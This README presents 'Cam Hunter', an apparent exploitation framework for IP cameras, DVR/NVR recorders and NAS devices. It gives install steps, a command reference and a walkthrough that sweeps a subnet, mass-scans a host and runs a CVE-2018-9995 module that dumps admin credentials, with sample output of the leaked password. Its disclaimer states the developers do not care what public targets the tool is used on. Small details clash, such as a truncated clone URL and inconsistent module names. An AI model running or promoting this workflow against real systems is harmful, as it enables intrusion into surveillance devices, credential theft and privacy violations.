# 📡 CAM HUNTER — Advanced DVR / NVR / XVR Security Testing Framework

Cam Hunter is an elite, modular, and asynchronous penetration testing framework engineered to identify, verify, and exploit critical vulnerabilities on video surveillance infrastructure (IP cameras, DVR/NVR/XVR recorders) and network storage ecosystems (NAS). 

Equipped with **61 dynamically loaded modules**, it acts as a comprehensive, localized threat-assessment suite featuring both an interactive CLI console and a hardware-accelerated dark theme desktop application.

---

## 🛠️ Project Layout & Component Blueprint

The repository follows a clean, decoupled structure where scripts are automatically mapped by the core loader engine without hardcoded structural dependencies.

```text
dvr-exploit-framework/
│
├── core/
│   ├── __init__.py
│   ├── base.py             # Abstract parent object for module standardization
│   └── loader.py           # Recursive dynamic python script mapper engine
│
├── modules/                # Massive 61-modules exploit dictionary sorted by OEM/Vendor
│   ├── amcrest/            ├── dlink/              ├── lorex/              ├── synology/
│   ├── axis/               ├── foscam/             ├── netgear/            ├── trendnet/
│   ├── bosch/              ├── grandstream/        ├── panasonic/          ├── tplink/
│   ├── brickcom/           ├── hikvision/          ├── recon/              ├── uniview/
│   ├── cve_2018_9995_gen/  ├── linksys/            ├── reolink/            └── xiongmai/
│   └── lsc/                └── samsung/            └── vivotek/
│
├── reports/                # Central reporting engine outputs
│   ├── dashboard.html      # Interactive web dashboard with metrics telemetry
│   └── vulnerabilities.txt # Centralized structural text logging ledger
│
├── main.py                 # Core CLI console shell (TAB history, shortcuts, loops)
├── gui_main.py             # PySide6 Cyberpunk Dark Theme Graphical Application Interface
├── Makefile                # Automation workflow task short-bindings
├── docker-compose.yml      # Multi-layer orchestration file
├── Dockerfile              # Isolated sandbox build configuration
└── requirements.txt        # Host python environment package index
```

---

## 🚀 Installation & Workspace Initialization

### Option 1: Native Deployment (Host Machine)
Ensure you are using Python 3.10 or superior. Isolating the repository setup within a dedicated Python virtual environment is highly recommended:

```bash
# Clone the repository
git clone https://github.com
cd cam-hunter

# Setup the virtual environment and install packages via the Makefile utility
make install

# Scenario A: Fire up the interactive Power-User CLI shell
make run

# Scenario B: Launch the PySide6 Cyberpunk Graphical Interface
make gui
```
*Note: Windows users can activate support for input line-tracking and history memory blocks by running `pip install pyreadline3` manually inside the active workspace environment.*

### Option 2: Isolated Container Deployment (Docker / Docker-Compose)
To audit target machines safely inside an isolated system sandbox while preserving your operational HTML logs files on your host terminal computer:

```bash
# Build the operational container image layers
docker-compose build

# Spin up the framework console in full interactive TTY mode
docker-compose run cam-hunter
```

---

## 💡 Command-Line Interface (CLI) & GUI Operational Manual

Cam Hunter includes advanced **Power-User Shortcuts**, **Smart Auto-Completion** via the **[TAB]** key, and **Real-Time Dynamic Filtering** inside the graphical application view.

### 📋 Supported System Instructions Matrix

| Explicit Input Command | Power Shortcut / Alias | Context Scope & Behavioral Guidelines |
| :--- | :--- | :--- |
| `help` | `h` | Renders the complete, localized advanced shortcuts reference panel. |
| `show modules` | `lm` | **[List Modules]** Enumerate all 61 dynamically loaded audit assets. |
| `show options` | `lo` / `options` | **[List Options]** Review mandatory context parameters for the loaded module. |
| `search <keyword>` | *None* | Filter the internal modules registry instantly by vendor brand name or CVE ID. |
| `use <module_path>` | *None* | Initialize a target script vector (Supports predictive TAB-completion paths). |
| `set <KEY>=<value>` | *None* | Bind data values to variables (Accepts spaces, words, or standard operational `=` format). |
| `run` / `exploit` | `x` | **[Execute]** Fire the active module's asynchronous network payload loops. |
| `vulnscan <IP>` | `vs <IP>` | **[Global Scan]** Consecutively cycle ALL scanner scripts against a target host IP. |
| `back` | *None* | Unload active context layers and return to the generic root framework prompt level. |
| `exit` | *None* | Terminate runtime safely and write shell inputs persistently into `.cam_hunter_history`. |

---

## 🎯 Practical Auditing Scenarios (Step-by-Step Workflow)

### Phase 1: Local Network Asset Hunting
Find active video surveillance systems on your target local network segment in under 3 seconds using the fast asynchronous TCP thread scanner:
```text
cam-hunter(none) > use recon/subnet_tcp_sweeper
cam-hunter(recon/subnet_tcp_sweeper) > set SUBNET 192.168.1.0/24
cam-hunter(recon/subnet_tcp_sweeper) > x
...
[+] Discovery phase completed! Live surveillance assets found:
  192.168.1.45       | 81         | Alternative Web/DVR Management (e.g., CVE-2018-9995)
...
cam-hunter(recon/subnet_tcp_sweeper) > back
```

### Phase 2: Mass Vulnerability Profiling
Pass the discovered host target to the global pipeline scan to analyze its exposure profile against the entire exploit dictionary:
```text
cam-hunter(none) > vs 192.168.1.45
[!] TRIGGERING GLOBAL AUTOMATED VULNERABILITY CYCLES AGAINST 192.168.1.45 [!]
---------------------------------------------------------
[*] Running verification script: cve_2018_9995_generic/device_rsp_scan...
  [VULNERABLE] -> Target is VULNERABLE to CVE-2018-9995. Leaked 2 user records.
...
[+] GLOBAL CYCLES TERMINATED. Total vulnerabilities flagged: 1
```

### Phase 3: Exploitation and Credential Harvesting
Instantly fire the attack module payload to dump raw user passwords, update database logs, and auto-refresh the visual reporting matrix:
```text
cam-hunter(none) > use cve_2018_9995_generic/device_rsp_attack
cam-hunter(cve_2018_9995_generic/device_rsp_attack) > set TARGET=192.168.1.45
cam-hunter(cve_2018_9995_generic/device_rsp_attack) > set PORT 81
cam-hunter(cve_2018_9995_generic/device_rsp_attack) > x
[*] Executing automated offensive loops cve_2018_9995_generic/device_rsp_attack tracking host 192.168.1.45...
  [Execution payload returned result] {'success': True, 'details': 'Credentials dumped successfully!\n  -> User: admin | Pass: supervisor123 (RoleID: 1)'}
[+] Finding logged. HTML Dashboard refreshed inside 'reports/dashboard.html'
cam-hunter(cve_2018_9995_generic/device_rsp_attack) > exit
```

Open your local browser to **`reports/dashboard.html`** to review your live operational metrics metrics pane.

---

## 🎨 Graphical User Interface (GUI) Workspace

For operators who prefer a visual orchestration terminal over the standard CLI shell, Cam Hunter embeds a hardware-accelerated **Cyberpunk Dark Theme Desktop Application** powered by **PySide6 (Qt for Python)**. 

The GUI ties directly into the core asynchronous routing engine without modifying any of the 61 underlying testing scripts.

### 🌟 Key Graphical Features
*   **Non-Blocking Runtime Threading (`QThreads`)**: Long-running network tasks, scans, and asynchronous exploit loops run safely in the background. The window layout never freezes or crashes during active network queries.
*   **Real-Time Dynamic Module Filtering**: Includes an integrated, instant search bar at the top of the sidebar. Typing keywords (e.g., `dahua`, `cve`, `scan`) dynamically updates the list widget in real time to isolate target vectors instantly.
*   **Fluid Input Matrix Generation**: Selecting any module from the repository auto-generates the target options data table dynamically based on that specific script's internal variable needs (`TARGET`, `PORT`, `CMD`).

### 📟 Launching the GUI App
Ensure you have installed the desktop framework components (`pip install PySide6`), then run the shortcut trigger directly via your terminal terminal workspace:

```bash
make gui
```

### 🖼️ Interface Blueprint Layout
```text
┌──────────────────────────────────────┬────────────────────────────────────────┐
│  🎯 REPOSITORY MODULES               │  🚀 ACTIVE PAYLOAD: axis/cve_2023_21406│
├──────────────────────────────────────┼────────────────────────────────────────┤
│ 🔍 Search module (e.g., dahua)...   │  [Variable Key]    [Configured Value]  │
├──────────────────────────────────────┤  TARGET            192.168.1.50         │
│ 📁 axis/                             │  PORT              80                   │
│    ├── cve_2023_21406_attack         │                                        │
│    └── cve_2023_21406_scan           ├────────────────────────────────────────┤
│ 📁 bosch/                            │  🚀 FIRE OFFENSIVE EXPLOIT LOOP        │
│ 📁 dahua/                            ├────────────────────────────────────────┤
│ ... [61 modules indexed]             │  📟 LIVE SYSTEM OPERATIONAL LOGS       │
│                                      │  [+] Loaded workspace parameters...    │
│                                      │  [*] Connection loop initialized...    │
└──────────────────────────────────────┴────────────────────────────────────────┘
```

---

## ⚠️ Legal Disclaimer

**LISTEN UP:** This framework is provided strictly for educational research, defensive threat modeling, and authorized penetration testing operations against owned hardware assets. 

**The developers do not give a single damn about what you use this tool for, how you use it, or what public targets you fire it at.** 

If you decide to do stupid things, break networks you do not own, hijack private camera video feeds, or violate international data privacy laws, **that is entirely on you.** You are an adult responsible for your own actions. The author completely disclaims all legal liability for malicious behavior, legal prosecution, network damage, or data loss caused by misuse of this software. Use it responsibly or face the consequences on your own.

---

## 📄 License

### MIT License

Copyright (c) 2026 Cam Hunter Developers

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
